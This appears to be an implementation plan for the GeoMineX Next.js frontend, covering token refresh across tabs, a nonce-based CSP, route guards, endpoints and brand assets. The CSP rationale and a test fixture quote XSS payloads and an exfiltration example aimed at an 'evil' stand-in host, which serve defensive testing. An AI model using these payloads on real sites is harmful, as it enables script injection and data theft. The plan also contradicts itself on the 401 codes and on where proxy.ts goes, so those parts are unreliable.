# GeoMineX Frontend — Implementation Plan

## Context

The backend is complete and verified: 48 endpoints across 12 modules, 389 tests, subsidiary-scoped RBAC, document and AI-query pipelines with crash recovery. **The frontend does not exist — zero files.** `frontend/`, `web/`, `client/` and `apps/` are all absent, and the root `package.json` has no frontend script.

This plan builds it. Three research findings reshaped the approach before any design was drawn:

1. **PRD §11.9 and §11.10 are not open decisions any more — the code has already made both.** `backend/src/config/env.ts:223` refuses to boot when `DEPLOY_TOPOLOGY=cross-site`, because the CSRF layer §9.14 requires for split origins was never built. So **same-site is forced**. And the refresh cookie is scoped `Path=/api/v1/auth` with the access token returned in the JSON body — a Next server holding only that cookie cannot fetch `/api/v1/documents` on the user's behalf. So **§11.10 Option 1 (client-side fetching) is the only shape the backend supports**. Both are recorded as unresolved blockers in the PRD; they need to be closed, not deliberated.

2. **Nothing streams and nothing is real-time.** Grepping `backend/src` for `text/event-stream`, `EventSource`, `WebSocket`, `socket.io` and `res.write(` returns zero hits, and neither `ws` nor `socket.io` is a dependency. PRD §5.7 mandates "streamed responses" and §7 names Socket.IO for status events; neither exists. Per your decision, the frontend polls and the transport stays swappable behind one hook.

3. **The PRD's role model is out of date in one place.** §5.5 implies CIL Users publish reports. `backend/src/modules/reports/report.routes.ts:112,125` gates both publish and archive to `admin` only — a deliberate separation of duties. The UI must follow the code.

Blueprint precedence (`instructions.md` Section 0) holds throughout: §7 of the blueprint is Vite-only and does not apply; structure comes from PRD §10.5, the environment contract from §7.1, and CSP from §9.13 (Next, not Helmet).

A fourth finding arrived with the brand mark and is handled in **Brand identity** below: the supplied logo carries the **State Emblem of India**, which private bodies may not use, and the file itself is a JPEG with a transparency checkerboard baked into its pixels.

---

## Verified dependency versions

Per the blueprint's Version Safety Rule, each was web-searched at plan time. **Re-verify with `npm show <pkg> version` at install time — do not paste these into `package.json` from here.**

| Package | Latest verified | Note |
|---|---|---|
| `next` | 16.3.4 | Next 16 is Active LTS. **Next 15 reaches EOL 21 Oct 2026** — do not start on 15. |
| `react` / `react-dom` | 19.2.8 | Required by Next 16. |
| `@tanstack/react-query` | 5.102.8 | Server state; React 18+. |
| `recharts` | 3.10.1 | Declares React 19 support. Trend/area charts (§5.6), analytics (§5.3). |
| `@visx/wordcloud` | 3.12.x | d3-cloud layout, maintained. `react-wordcloud` is unmaintained — avoid. |
| `zod` | 4.x | Match the backend's `^4.5.4` so schemas can be mirrored. |
| `tailwindcss` | 4.x | **v4 has no `tailwind.config.js`** — the §6 palette goes in `globals.css` under `@theme` as CSS variables. shadcn/ui initialises on v4 by default. |
| `react-hook-form`, `dompurify`, `date-fns` + `date-fns-tz` | verify at install | `date-fns-tz` is required — §4.6 mandates IST rendering of UTC timestamps. |

Mirror the backend's tooling: Vitest, ESLint 10 flat config, TypeScript strict, ESM.

---

## Scope

Full v1 — all eleven §5 screens (§5.11 Session Management was added in PRD v1.3), sequenced in six phases that can be paused between.

---

## Brand identity

Source: `IMG-20260906-WA0004.jpg`, 1254×1254. Treat it strictly as a **visual reference**, never as a shipped asset — it has three defects, two of them disqualifying.

### What is wrong with the supplied file

1. **It carries the State Emblem of India** (Lion Capital + सत्यमेव जयते), occupying `y 0–350`. Section 3 of the State Emblem of India (Prohibition of Improper Use) Act, 2005 bars private bodies from using it "in any manner which tends to create an impression that it relates to the Government", naming badges and brochures explicitly. A student team is not an authorised body, and the audience for this submission is Ministry of Coal officials. **Crop at `y=356`; the badge becomes the top element.** The tricolour arc already inside the badge is the legitimate national reference and is not restricted the same way.
2. **The transparency checkerboard is baked in.** The file is JPEG/RGB with no alpha channel, and its background alternates `#FFFFFF` and `#ECECEC` in ~14px tiles — real pixels, not an editor overlay. Placed on the §6 navy header it renders a grey checkered box.
3. **Lossy, single-resolution raster.** JPEG artifacts sit on the crisp navy edges, and the badge's fine detail — globe gridlines, satellite antenna, truck wheels — is illegible below roughly 48px.

**Resolution: rebuild the mark as hand-authored SVG** using the JPEG as reference. That answers all three defects at once and gives a logo that recolours, scales and weighs almost nothing.

### The palette already fits §6

Sampled from the source: navy `#002040`, orange `#F06000`, green `#006020`, plus ochre strata browns confined to the badge. §6 specifies `#0B1F3A` and `#F58220` — near-identical. Unlike the earlier violet picker, **this mark needs no reconciliation.**

The green is the one genuinely new colour, and it fills a real gap: §6 has no success token, while document status needs one for `validated`. Adopt it as `--color-success: #006020`, which measures **7.9:1 on white** and clears AA comfortably. Pair every status colour with an icon or shape — green/red alone fails colour-blind users, and §6's contrast rule does not cover that.

### Assets to produce

Measured crop regions from the source: badge `y 356–927, x 336–920`; wordmark `y 932–1086`; chakra rule `y 1093–1165`; tagline `y 1174–1210`.

Two homes, and the split matters. Anything rendered **inside** the app is a React component holding inline SVG (`src/components/brand/`). Anything a **browser or crawler fetches by URL** must be a real file (`public/brand/`) — a favicon cannot be a React component.

| Asset | Where it lives | Content | Used by |
|---|---|---|---|
| `Mark.tsx` | component | circular badge alone | app header, collapsed sidebar, loading state, error pages |
| `LockupVertical.tsx` | component | badge over wordmark over tagline | login, invite accept, home hero |
| `LockupHorizontal.tsx` | component | mark left, wordmark right | public nav, authenticated app header |
| `Wordmark.tsx` | component | "GeoMineX" only, `fill="currentColor"` | footer, tight widths, knockout on navy |
| `favicon.svg`, `favicon.ico` | `public/brand/` | simplified navy peak + ochre strata on a navy tile | browser tab |
| `apple-touch-icon.png` (180) · `icon-192.png` · `icon-512.png` | `public/brand/` | same simplified mark | iOS, PWA manifest |
| `og-image.png` (1200×630) | `public/brand/` | navy field, horizontal lockup, tagline | link previews |

**The wordmark must have a knockout variant.** §6 mandates Primary Dark Blue chrome for the header and Admin Panel — and the wordmark is navy, so it would vanish. Author it with `fill="currentColor"` so one file serves both grounds; the badge stays multicolour and keeps its own fills.

**Favicon is a separate drawing, not a scaled badge.** Only the peak silhouette and the strata bands survive at 16px; the globe, satellite and truck do not.

### Rules for use

- **Inline the SVGs as React components**, not `next/image`. No extra request, no layout shift, and `currentColor` recolouring works. Reserve `next/image` for the raster icons and OG image.
- **Author with presentation attributes, never an embedded `<style>` block.** An SVG carrying inline CSS needs the CSP nonce we generate in `proxy.ts` — a silent breakage that presents as an unstyled logo. Attributes sidestep it entirely; `img-src 'self' blob: data:` already covers the rasters.
- **Minimum sizes:** mark 24px; horizontal lockup 120px wide; vertical lockup 180px wide. Below 120px drop the tagline rather than shrink it.
- **Clear space:** half the mark's height on all sides.
- Every logo instance needs an accessible name — `role="img"` with a `<title>`, or `aria-hidden` when it sits beside the visible word "GeoMineX" and would otherwise be announced twice.
- The public footer says **"A Smart India Hackathon 2026 project"** — factual, and it makes the government connection without implying authority, which is the same problem the emblem created.

Emails stay **plain text** (your call, and the right one): better deliverability, no image blocking, and it avoids widening `deliver()` plus adding `EMAIL_FROM_NAME`, since `EMAIL_FROM` is validated as a bare address and rejects the `Name <addr>` form.

---

## PRD v1.3 amendments — ✅ DONE

Executed in Phase 0. `claude_updated_prd.md` is now v1.3, `instructions.md` Section 0 is cleaned up, the seed lists CMPDI instead of NEC, `trust proxy` is configurable, and the backend is green at 389/389. Recorded here for traceability.

**One amendment remains, and belongs with the brand work:** add the logo rules to §6 — the emblem prohibition, the `--color-success` token, minimum sizes, and the knockout requirement. §6 currently specifies a palette and nothing else, so a future contributor has no recorded reason not to reinstate the emblem.

| § | Change |
|---|---|
| §11.9 | Resolve: **same-site**. Next `rewrites()` proxies `/api/v1/*`; cookie stays `SameSite=Strict`; no CSRF token layer. Record that `env.ts` enforces this at boot. |
| §11.10 | Resolve: **Option 1, client-side fetching**. Record the reason — the refresh cookie's `Path=/api/v1/auth` scope makes server-proxied data fetching impossible without re-architecting auth. |
| §5.5 | Correct: publish **and** archive are Admin-only. CIL Users create and edit drafts. |
| §5.7 / §7 | Replace "streamed responses" with progressive status via polling; move Socket.IO to a Phase-2 note. Record the poll interval and terminal states. |
| §5.x (new) | Add the **Session Management** screen (§9.3 requires view/revoke of own sessions; §13 makes it an acceptance criterion; no §5 entry exists). |
| §11.1 | Resolve: **email OTP**, already built. The magic-link `history.replaceState` requirement in §5.2 therefore does not apply to login — but **does** apply to `/invite/accept?token=`. |
| §9.2 | State the upload limit numerically: **25 MiB** (`MAX_UPLOAD_BYTES` default 26214400). §9.2 requires "one explicitly documented maximum" and never gives it. |
| §13 | Add criteria for: the three distinct 401 codes being branched on, cursor lists having no `total`, 404-rendered-as-not-found, and CSP verified on a rendered page. |
| §6 | Two fixes. (a) The instruction "extend `tailwind.config.js` theme colors" is **stale** — Tailwind v4 removed the JS config; the palette becomes CSS custom properties under `@theme` in `globals.css`. The *intent* (semantic tokens, never hardcoded hex in components) is unchanged and still binding. (b) Note the accessibility floor is colour contrast only; record shadcn/ui + Radix as how keyboard and ARIA behaviour is met. |

Then delete the now-dead rows in `instructions.md` Section 0 (§11.9 / §11.10 blockers), as its own §13 maintenance rule requires.

**One data fix while we are here.** `backend/src/scripts/seed.ts:18-27` seeds eight subsidiaries ending in `NEC — North Eastern Coalfields`. NEC is a CIL *unit*, not a subsidiary; CIL's eight are the seven coal producers **plus CMPDI**, and CMPDI is missing — despite being named in the problem statement. Every subsidiary picker, filter and scope badge in the new UI renders this list, so correct it before building screens on top of it. Same error was flagged in the SIH deck.

---

## Architecture spine

This is Phase 2 and the only genuinely risky part. Everything after it repeats a proven pattern.

### Transport: a typed `fetch` wrapper, not Axios

PRD §10.5 mandates the two-file split (`client.ts` with interceptors, `refreshClient.ts` without) but not the library — the blueprint's Axios sample is Vite-era. Keep both filenames and both roles, implement them over native `fetch`. TanStack Query already owns caching, retries and de-duplication, so Axios's remaining value here is one ~30-line refresh hook. One less dependency on the critical path.

### Refresh: single-flight *and* cross-tab — verified against the source

Two facts from `auth.service.ts:210-260`, both confirmed by reading it:

1. Presenting an **already-rotated** token revokes the entire family as a breach signal. A duplicate refresh does not waste a request — it logs the user out.
2. A **successful** refresh sets `revokedAt` on the *old session document* and issues a new one with a new `_id`. Access tokens embed `sid` (`utils/jwt.ts`) and `requireAuth.ts:35` rejects a revoked session with `TOKEN_INVALID`.

Fact 2 is the one that bites, and it is not in the PRD. **Every successful refresh instantly invalidates every access token issued earlier in that family.** Invisible with one tab. With three tabs, tab B's routine 15-minute refresh kills tab A's perfectly fresh token roughly every five minutes. Naively treating `TOKEN_INVALID` as "re-login" makes the app single-tab-only, and nobody notices until UAT because developers test one tab.

So the refresh manager needs three layers, all at module scope, never React state:

| Layer | Primitive | Prevents |
|---|---|---|
| Intra-context | module-level `inFlight` promise | StrictMode double-effect, N concurrent 401s |
| Cross-tab | `navigator.locks.request('geominex:refresh', …)` | two tabs refreshing at once |
| Token sharing | `BroadcastChannel('geominex:auth')` | fact 2 — tabs invalidating each other |

The winning tab broadcasts `{accessToken, user, expiresAt}`; siblings **adopt** it instead of refreshing. Stays in memory, same-origin, never persisted — §9.13 intact. Also broadcast `logged-out`, since `POST /auth/logout` revokes the newest session, which is the one every tab now shares.

**StrictMode:** a `useRef` guard is per-component and will not stop the second call. Put the bootstrap promise at **module evaluation**, not in a `useEffect` — `export const bootstrapPromise = refreshManager.refresh().catch(() => null)`. Two concurrent bootstraps race between `findOne` and `save` in `refreshSession`, and the loser revokes the family. Keep `refreshManager.ts` tiny so Fast Refresh doesn't reset its module state.

Add a **terminal `sessionDead` flag**: once refresh returns any 401, every later `refresh()` rejects with no network call until an explicit login. Without it, twelve queued queries each fire their own refresh after the first fails.

### There are four 401 codes, not three

`requireAuth.ts:20` throws `UNAUTHORIZED` when the `Authorization` header is missing — which is exactly what a request racing ahead of bootstrap gets. A wrapper switching on only three codes falls through to a generic error on cold load.

| Code | Action |
|---|---|
| `UNAUTHORIZED` | Bootstrap hasn't landed. `await bootstrapPromise`, retry once. **Not a logout.** |
| `TOKEN_EXPIRED` | Single-flight refresh, retry once. |
| `TOKEN_INVALID` | **Attempt one recovery refresh, then retry.** Log out only if that fails. Usually a sibling tab's legitimate refresh (fact 2) — not a security event. |
| `REFRESH_TOKEN_INVALID` | Terminal. Set `sessionDead`, broadcast, hard-navigate to `/login`. |
| `RATE_LIMIT_EXCEEDED` (429) | **Never a logout.** Backoff. Bootstrap spends `authLimiter` quota (10/min) on every page load, so tabs + reloads can legitimately hit it. |

Set TanStack Query `retry: false` for all 4xx — the default `retry: 3` multiplies a 401 storm straight into the rate limiter.

**Proactive refresh** at ~80% of TTL (12 min), held only by the lock owner and gated on `document.visibilityState`, keeps the reactive path rare — which matters most for the 25 MiB upload.

### Bootstrap without a login flash

A page reload wipes the in-memory token. `AuthProvider` mounts with `status: 'loading'`, calls `POST /auth/refresh`, then resolves to `authenticated` or `unauthenticated`. A 401 here is the **normal** unauthenticated case, not an error — do not redirect from the provider, and do not log it. Render a skeleton, never the login screen, while `status === 'loading'`.

Because `requireAuth` re-checks the user and session in the database on **every** request (`requireAuth.ts:25-36`), a deactivated user or admin-revoked session produces `TOKEN_INVALID` mid-session, not at token expiry. Handle it anywhere, not just at bootstrap.

### Route protection — client-side, in a route-group layout

Next 16 renamed `middleware.ts` to `app/proxy.ts`, moved it to the Node runtime, and the Next team explicitly scopes it to routing, **not auth**. That suits us: the token is in memory and the server cannot read it, so a server-side guard is impossible by construction.

- `app/(app)/layout.tsx` — a client component wrapping `<RequireAuth>`. One guard, one place.
- `app/(app)/admin/layout.tsx` — additionally wraps `<RequireRole roles={['admin']}>`.
- Unauthenticated → `router.replace('/login?next=' + encodeURIComponent(pathname + search))`.
- `/login` reads `?next=`, and **validates it is a relative path** — starts with `/`, does not start with `//`, no scheme. Otherwise it is an open redirect. Falls back to the role-based landing page (§5.2).
- Guards are UX only. §9.1: *"hiding UI elements is not authorization."* The server is the control; the UI hiding a Publish button is a convenience.

### CSP — nonce in `proxy.ts`, not static headers

A static header list in `next.config.ts` cannot avoid `script-src 'unsafe-inline'`, because the App Router injects inline bootstrap and hydration scripts. §9.13 forbids gratuitous `unsafe-inline` precisely here, so generate a per-request nonce in `app/proxy.ts`:

```
default-src 'self';
script-src 'self' 'nonce-{N}' 'strict-dynamic';
script-src-attr 'none';
style-src 'self' 'nonce-{N}';
style-src-attr 'unsafe-inline';
img-src 'self' blob: data:;
font-src 'self' data:;
connect-src 'self';
worker-src 'self' blob:;
object-src 'none';
frame-src 'none';
frame-ancestors 'none';
base-uri 'none';
form-action 'self';
upgrade-insecure-requests;
```

The non-obvious directives, each earning its place:

- **`'strict-dynamic'` is required, not decorative** — the bundler loads lazy chunks via `document.createElement('script')`, which inherits trust only under `strict-dynamic`.
- **`style-src-attr 'unsafe-inline'` is required by Radix** (shadcn/ui's Popover, DropdownMenu, Dialog, Tooltip write inline `style=""` for positioning; attributes cannot carry a nonce). This is the narrow, honest version of the blanket `style-src 'unsafe-inline'` I first sketched — omit `style-src-attr` and every dropdown renders at 0,0. Close the residual gap by excluding `style` from the DOMPurify attribute allowlist.
- **`script-src-attr 'none'` is the free win** — it kills `<img src=x onerror=…>`, precisely the payload shape a poisoned PDF yields, even if DOMPurify is misconfigured.
- **`connect-src 'self'` is the payoff of the rewrite topology.** If anyone later points the frontend at the Express origin directly, the app breaks loudly instead of degrading quietly.
- **`img-src` gets `blob:` but never `https:`** — a bare `https:` would let AI-derived HTML exfiltrate via `<img src="https://evil/?d=…">`.
- **`base-uri 'none'`** — an injected `<base href>` silently repoints every relative load; cheapest high-value directive here.

**Dev needs a different policy** (`'unsafe-eval'`, `ws:` for HMR). Branch on `NODE_ENV` inside `proxy.ts`, and add a test asserting the production header contains neither `unsafe-eval` nor `script-src … 'unsafe-inline'`.

The one accepted cost: **a nonce is per-request, so pages that read it render dynamically.** The four public pages lose static generation. Do **not** enable `cacheComponents`/PPR — a prerendered shell with a stale nonce blocks every script, intermittently and cache-dependently, which is the worst failure shape available.

### Session rotation, confirmed against the running backend (Phase 2)

Every claim the design rests on was checked with curl through the Next rewrite, not inferred:

| Check | Result |
|---|---|
| Cookie attributes through the rewrite | `Path=/api/v1/auth; HttpOnly; SameSite=Strict` — the path coupling holds |
| Token held before a refresh, used after it | **`TOKEN_INVALID`** — this is the multi-tab killer, and it is real |
| Token issued by the refresh | works |
| Replaying the spent refresh cookie | `REFRESH_TOKEN_INVALID` — reuse detection fires |
| The *new* token after that reuse detection | **also `TOKEN_INVALID`** — the whole family was revoked |

The last row is the one that matters: a duplicate refresh does not waste a request, it ends every session the user has. That makes the three-layer deduplication (module promise → Web Lock → BroadcastChannel) a security control, and it is why `TOKEN_INVALID` gets one recovery refresh instead of an immediate logout.

### Two Next 16 conventions that cost time in Phase 1 — both verified, not guessed

1. **`proxy.ts` goes at the project root or `src/`, never in `app/`.** Several guides say `app/proxy.ts`; `next/dist/build/utils.js:280` says otherwise. Placed in `app/` it is silently ignored — no warning, no error, and every page ships with no CSP at all. The build output line `ƒ Proxy (Middleware)` is the confirmation that it registered.
2. **A nonce CSP requires `export const dynamic = 'force-dynamic'` in the root layout.** Setting the header in `proxy.ts` is not enough on its own. Verified against a running build: with the page statically prerendered, the response carried a fresh per-request nonce while the HTML contained **zero** `nonce=` attributes across all ten script tags, including two inline ones. Since `'strict-dynamic'` makes CSP3 browsers ignore `'self'`, every script would have been blocked and the page would have served as inert un-hydrated HTML. Headless Chrome reported no violations, so this cannot be caught by eyeballing the console — compare the header nonce against the HTML attribute directly.

### Ranked traps

1. **The rewrite must preserve the path exactly.** `source: '/api/v1/:path*'` → `destination: '${API_ORIGIN}/api/v1/:path*'`. The refresh cookie is `Path=/api/v1/auth`; if anyone "tidies" the rewrite to `/api/:path*`, the browser path becomes `/api/auth/refresh`, the cookie is no longer in scope, it is never sent, and **every refresh fails with no visible cause**. Put that sentence in `next.config.ts` as a comment.
2. **Duplicate refresh revokes the session family** — see above. Assert it with the concurrent-request test in Verification 5.
3. **`trust proxy: 1` is now wrong — and it is a backend bug this topology creates.** `app.ts:26` trusts exactly one hop. In production the chain becomes browser → LB → **Next** → Express, which is two. Express then reads the *load balancer's* IP, so `authLimiter`'s 10/min becomes a **global budget for every user at once**, and every `recordAudit({ipAddress})` row records the LB — silently gutting the §9.6 compliance trail. Fix the hop count in Phase 0 and verify it before any UI exists.
4. **Logout must be a hard navigation, not `router.replace`.** `queryClient.clear()` is necessary and insufficient: it does not cancel in-flight requests (a query issued with user A's token can resolve into user B's fresh cache), does not touch component-local state, does not defeat bfcache, and does not revoke blob URLs. Order: null the token → `await queryClient.cancelQueries()` → `queryClient.clear()` → `window.location.replace('/login')`. A full document teardown is the only thing that guarantees no residue, and it costs one page load on the one action where a page load is expected. Also: **ban `persistQueryClient` in ESLint**, not in a comment — persisting authenticated server state is a direct §9.13 violation that will look like a reasonable performance idea to someone.
5. **Documents cannot be previewed in an `<iframe>` or `<embed>`.** `GET /documents/:id/file` requires a bearer header (which the browser will not attach to a subresource load) and sets `Content-Disposition: attachment` (`document.controller.ts:62`). Preview must be `apiFetch` → `Blob` → `URL.createObjectURL` → pdf.js canvas. That is what drives `img-src blob:` and `worker-src blob:` in the CSP and what makes `object-src 'none'` affordable. Revoke every object URL on unmount.
6. **`fetch` has no upload progress event.** PRD §5.4 wants live per-file status, so the upload path is a hand-rolled `XMLHttpRequest` in `lib/api/upload.ts` using `xhr.upload.onprogress` — calling the *same* `refreshManager`, so there are not two divergent auth brains. Refresh proactively before starting an upload if the token expires within 5 minutes; a mid-upload 401 re-sends 25 MiB.
7. **25 MiB uploads stream through the Next rewrite.** Next streams rather than buffers, but intermediate proxies cap independently — nginx defaults `client_max_body_size` to **1 MB**, and some platforms cap request bodies around 4.5 MB. **Push a real 24 MiB PDF through the deployed proxy in week one.** If the platform caps below 25 MiB, the upload path must bypass the rewrite, which reopens the topology decision the backend refuses to boot without.
8. **`credentials: 'include'` on `/auth/*` calls.** Same-origin fetch sends cookies by default, but set it explicitly so a later origin change does not silently break sign-in.

## Directory structure

Follows PRD §10.5, adapted to the App Router. `src/` root; path alias `@/*`.

```
frontend/
├── next.config.ts              # rewrites /api/v1/* → API origin; security headers
├── public/
│   ├── brand/                  # favicon.svg/.ico, apple-touch-icon, icon-192/512, og-image
│   └── manifest.webmanifest
├── app/
│   ├── proxy.ts                # Next 16's renamed middleware — CSP nonce only, NOT auth
│   ├── layout.tsx              # providers: QueryClient, AuthProvider, ErrorBoundary
│   ├── (public)/               # SSG: /, /about, /contact, /privacy
│   ├── (auth)/                 # /login, /invite/accept
│   ├── (app)/                  # authenticated route group
│   │   ├── layout.tsx          # <RequireAuth> — the single client-side guard
│   │   ├── dashboard/ documents/ reports/ queries/ topics/ audit/ settings/
│   │   └── admin/              # <RequireRole role="admin">
│   └── not-found.tsx
├── src/
│   ├── lib/
│   │   ├── env.ts              # Zod over NEXT_PUBLIC_* — the ONLY process.env access
│   │   ├── api/{client,refreshClient,errors}.ts
│   │   ├── sanitize.ts         # DOMPurify allowlist + http/https scheme check
│   │   └── datetime.ts         # UTC → IST rendering, Indian fiscal quarters
│   ├── auth/{AuthProvider,tokenStore,useAuth}.tsx
│   ├── components/
│   │   ├── brand/{Mark,LockupVertical,LockupHorizontal,Wordmark}.tsx   # inline SVG
│   │   └── {RequireAuth,RequireRole,ErrorBoundary,ConfirmDialog,...}
│   └── features/<resource>/{api.ts,components/,types.ts}
└── .env.example                # NEXT_PUBLIC_API_BASE_URL only
```

`src/lib/env.ts` is the single source of truth for configuration and the only place `process.env` is read (§7.1). The frontend gets exactly one variable: `NEXT_PUBLIC_API_BASE_URL`.

---

## Feature modules → endpoints

One folder per API resource (§10.5). Each exports TanStack Query hooks from `api.ts`; components never call `client` directly.

| Module | Endpoints | Pagination |
|---|---|---|
| `auth` | `request-code`, `verify-code`, `refresh`, `logout`, `invites/accept`, `sessions` (GET/DELETE) | — |
| `users` | `/users/me`, `/users` (admin), invite, PATCH, subsidiary-access grant/revoke, force-logout | **offset** |
| `subsidiaries` | GET (scoped), POST (admin) | none |
| `documents` | list, detail, `/file`, `/chunks`, `/extracted-fields`, POST upload, `/retry`, PATCH `/extracted-fields/:id` | **cursor** |
| `reports` | list, detail, `/versions`, POST, PATCH, `/publish`, `/archive`; `/report-templates` | **offset** |
| `queries` | POST, list, detail (poll target), PATCH review, `/retry` | **cursor** |
| `topics` | GET `/topics` | none |
| `analytics` | GET `/analytics` | none |
| `dashboard` | GET `/dashboard`, `/dashboard/metrics` | none |
| `audit` | GET `/audit-logs` | **cursor** |

**Cursor responses carry `{nextCursor, limit}` and deliberately no `total`** (`backend/src/utils/envelope.ts:29`). Those lists get "Load more" / infinite scroll — never page numbers. Offset lists get `{total, page, limit, totalPages}` and real pagination controls. Two distinct list components; do not build one that assumes `total`.

---

## Screens

| # | Route | Roles | Notes |
|---|---|---|---|
| 1 | `/`, `/about`, `/contact`, `/privacy` | public | SSG. No internal data (§5.1). |
| 2 | `/login` | public | Email → OTP code. Two-step form. Response is always the same generic 200 — never reveal whether the account exists. |
| 2b | `/invite/accept?token=` | public | Read token, **`history.replaceState` immediately** (§5.2), then POST. |
| 3 | `/dashboard` | all | `quickStats` cards must render the **`computedAt` timestamp** (§13). `pendingWork` is a discriminated union of `kind:'document' \| 'query'`. |
| 4 | `/documents` | all read; upload admin + cil_user | Drag-drop, field name **`file`**, 25 MiB, extension allowlist checked client-side for UX only. Poll detail while `queued`/`processing`. Retry only when `failed` **and** `processingAttempts < 3`. Surface `requiresReview` and `injectionSuspected`. |
| 5 | `/reports` | all read; draft admin + cil_user; **publish/archive admin only** | Template picker → draft → editor → version history. **Not a rich-text editor**: `sections` is `[{heading ≤200, body ≤50 000}]`, 1–50 sections, both plain strings (`report.schema.ts:8-15`). A structured section editor with plain `<textarea>` bodies. Archive needs typed confirm = exact title. |
| 6 | `/topics` | all | Word cloud + line/area trend. `from`/`to` are **IST `YYYY-MM-DD`**, not ISO timestamps. `granularity=month\|quarter`. |
| 7 | `/queries` | all ask; review admin + cil_user; **approve admin only** | Chat + parliamentary query log. See the citation contract below. |
| 8 | `/audit`, and traceability deep-links | all (scoped) | Filter by action/user/subsidiary. Figure → source document + page via `GET /documents/:id/file`. |
| 9 | `/admin/users`, `/admin/subsidiaries` | admin | Disable self-demote/self-deactivate in the UI (`CANNOT_SELF_DEMOTE`). |
| 10 | `/settings/sessions` | all | View + revoke own sessions; mark `isCurrent`. **New — the PRD has no §5 entry for it.** |

### The AI query screen, precisely

`POST /queries` returns **201 with `status:'queued'` and no answer**. Poll `GET /queries/:id` every ~1.5 s until `status ∈ {answered, unsupported, failed, dead_lettered}`. `GET` is not rate-limited; `POST` and `/retry` are (12/min/user), so poll freely but debounce asking.

- **Inline citations work like this, and only this.** The server rewrites the model's reference markers into `[1]`, `[2]` … inside `responseText`, keeping only refs that survived validation, and returns the matching metadata in `citations[]` keyed by `ordinal` (`backend/src/modules/queries/citation.ts:142-156`). The component tokenises `responseText` on `/\[(\d+)\]/`, renders the text runs as plain text nodes, and replaces each marker with a link to `citations.find(c => c.ordinal === n)`. Numbers are the *only* thing parsed out of the prose — never the citation data itself (§8.1). A marker with no matching ordinal renders as inert text, never a dead link.
- `citations[]` is structured `{ordinal, documentId, documentFilename, chunkId, pageNumber, section, quote, relevance}` — each clicks through to the source document page.
- `answerStatus` is `sourced | partially_sourced | unsupported` — the UI must visually distinguish these, not present all three identically.
- `warnings[]` is **pre-rendered human-readable prose** from the server (`query.service.ts:157`). Render verbatim; do not re-derive from `retrieval` counts.
- `dead_lettered` is terminal and **cannot** be retried; only `failed` can. Do not offer a dead button.
- Two answer fields: `responseText` (model) and `officialResponseText` (human). They are not interchangeable.

---

## Cross-cutting requirements

Each maps to a §13 acceptance criterion.

- **404 is rendered as "not found", never "forbidden."** Cross-subsidiary denials return 404 by design (`backend/src/utils/authorization.ts:46`). A 403 means the resource *is* visible but the action is not — different message.
- **Three 401 codes branch differently**: `TOKEN_EXPIRED` → refresh + retry once; `TOKEN_INVALID` and `REFRESH_TOKEN_INVALID` → clear and redirect to login. Treating them alike either loops or logs people out needlessly.
- **Typed confirmation** — one `ConfirmDialog`, three call sites, three different expected strings: deactivate user = **email**; revoke subsidiary access = **subsidiary code**; archive report = **exact report title**. Handle `CONFIRM_TEXT_MISMATCH`.
- **`DELETE /users/:id/subsidiary-access/:subsidiaryId` requires a JSON body** `{confirm}`. Unusual but required — `fetch` supports it.
- **Boolean query params are the strings `'true'`/`'false'`**, never real booleans.
- **All path IDs must be 24-hex ObjectIds** or the API returns 400, not 404. Validate before navigating.
- **Render all document- and AI-derived text as React text nodes.** Report bodies, query answers and citation quotes are all plain strings server-side — none is HTML. Rendering them as `{text}` with `whitespace-pre-wrap` satisfies §9.13 outright and is safer than sanitizing. **Do not introduce a markdown or rich-text renderer**; that would manufacture the XSS surface the PRD is worried about. Keep `dompurify` installed and a `sanitizeHtml()` helper ready with an explicit allowlist, so that if any view later does render HTML there is one blessed path — but ship v1 with zero `dangerouslySetInnerHTML`.
- **Scheme-check every derived URL** to `http:`/`https:` before it reaches an `href` or `src` (§9.13) — an extracted or model-produced `javascript:` URL is a script-execution path that a tag allowlist alone does not close.
- **Dates**: store/transport UTC, render IST, bucket by Indian fiscal quarter (April start).
- **Clear the TanStack Query cache on logout** — otherwise the next user on a shared machine sees the previous user's cached data.

---

## Verification

Each phase ends green on all of these.

1. `npm run lint`, `npx tsc --noEmit`, `npm test`, `npm audit --audit-level=high` in `frontend/`.
2. **CSP proof**: `curl -sI http://localhost:3000/dashboard | grep -i content-security-policy` must return a policy on the **HTML document** — checking a JSON endpoint proves nothing (§9.13, audit finding E1).
3. **No persisted credentials**: after login, `localStorage` and `sessionStorage` are empty in DevTools (§13).
4. **Refresh works**: log in, wait past 15 min (or shorten `JWT_ACCESS_EXPIRES_IN`), act — exactly one `/auth/refresh` fires and the action succeeds.
5. **Single-flight proof**: fire 5 concurrent requests with an expired token — the Network tab shows **one** refresh, not five. Five would trigger reuse-detection and revoke the session family.
5b. **Multi-tab proof**: open three tabs, force a refresh in one, and act in the other two. Both must keep working. This is the acceptance test for the session-rotation finding; without token broadcast it fails within minutes.
5c. **Cookie proof**: a Playwright test reading `context.cookies()` (the cookie is HttpOnly, so `document.cookie` cannot see it) asserting `path === '/api/v1/auth'` and `sameSite === 'Strict'`, plus a login → hard-reload → still-authenticated check. This is what catches someone "tidying" the rewrite source path.
5d. **CSP layer-two proof**: render a fixture AI answer containing `<img src=x onerror=alert(1)>` and `<base href="https://evil/">`. Assert DOMPurify strips them, then **stub DOMPurify out** and assert CSP still blocks execution and fires a `securitypolicyviolation`. §9.13's whole argument is that CSP sits *behind* DOMPurify — this is the only test that proves the second layer exists.
6. **Scoping proof**: seed two subsidiaries, log in as a CIL user holding one, request the other's document ID — UI shows "not found", not "forbidden".
7. **Upload → poll**: upload a PDF, watch status walk `queued → processing → validated` without a manual refresh; force a failure and confirm Retry appears only while `processingAttempts < 3`.
8. **AI round trip**: ask a query, watch it reach a terminal state, confirm citations click through to the right document page and that `answerStatus` renders distinctly.
9. Run against the live backend (`npm run dev` at repo root) with the existing Postman collection as the oracle for response shapes.
10. Extend `.github/workflows/ci.yml` with a `frontend` job mirroring the backend one, and add `frontend/.gitignore` + `.cursorignore` entries per §9.10.
11. **Brand checks.** No shipped asset contains the State Emblem — inspect the brand components and eyeball each raster in `public/brand/`. No asset carries a checkerboard: open `mark.svg` and every PNG over a `#0B1F3A` swatch and confirm a clean edge. The wordmark inverts correctly on the navy app header. The favicon is legible at 16px in a real tab strip beside other tabs, not just zoomed in a viewer. Every logo instance has an accessible name or is `aria-hidden`. No brand SVG contains a `<style>` element (`grep -l '<style' src/components/brand/*.tsx public/brand/*.svg` must return nothing) — one would need the CSP nonce and would silently render unstyled.

---

## Sequencing

### Three pre-flight checks before any UI is written

Each can invalidate work already done, so none of them waits for a screen to exist.

